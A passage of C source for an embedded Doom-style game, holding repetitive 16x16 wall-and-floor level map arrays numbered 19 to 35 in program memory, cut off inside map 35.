const uint8_t PROGMEM doomLevelMap19[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
};

// =============================================================================
// DOOM LEVEL MAP DATA MATRIX #20
// =============================================================================
const uint8_t PROGMEM doomLevelMap20[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
};

// =============================================================================
// DOOM LEVEL MAP DATA MATRIX #21
// =============================================================================
const uint8_t PROGMEM doomLevelMap21[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
};

// =============================================================================
// DOOM LEVEL MAP DATA MATRIX #22
// =============================================================================
const uint8_t PROGMEM doomLevelMap22[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
};

// =============================================================================
// DOOM LEVEL MAP DATA MATRIX #23
// =============================================================================
const uint8_t PROGMEM doomLevelMap23[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
};

// =============================================================================
// DOOM LEVEL MAP DATA MATRIX #24
// =============================================================================
const uint8_t PROGMEM doomLevelMap24[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
};

// =============================================================================
// DOOM LEVEL MAP DATA MATRIX #25
// =============================================================================
const uint8_t PROGMEM doomLevelMap25[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
};

// =============================================================================
// DOOM LEVEL MAP DATA MATRIX #26
// =============================================================================
const uint8_t PROGMEM doomLevelMap26[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
};

// =============================================================================
// DOOM LEVEL MAP DATA MATRIX #27
// =============================================================================
const uint8_t PROGMEM doomLevelMap27[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
};

// =============================================================================
// DOOM LEVEL MAP DATA MATRIX #28
// =============================================================================
const uint8_t PROGMEM doomLevelMap28[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
};

// =============================================================================
// DOOM LEVEL MAP DATA MATRIX #29
// =============================================================================
const uint8_t PROGMEM doomLevelMap29[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
};

// =============================================================================
// DOOM LEVEL MAP DATA MATRIX #30
// =============================================================================
const uint8_t PROGMEM doomLevelMap30[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
};

// =============================================================================
// DOOM LEVEL MAP DATA MATRIX #31
// =============================================================================
const uint8_t PROGMEM doomLevelMap31[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
};

// =============================================================================
// DOOM LEVEL MAP DATA MATRIX #32
// =============================================================================
const uint8_t PROGMEM doomLevelMap32[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
};

// =============================================================================
// DOOM LEVEL MAP DATA MATRIX #33
// =============================================================================
const uint8_t PROGMEM doomLevelMap33[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
};

// =============================================================================
// DOOM LEVEL MAP DATA MATRIX #34
// =============================================================================
const uint8_t PROGMEM doomLevelMap34[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
};

// =============================================================================
// DOOM LEVEL MAP DATA MATRIX #35
// =============================================================================
const uint8_t PROGMEM doomLevelMap35[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
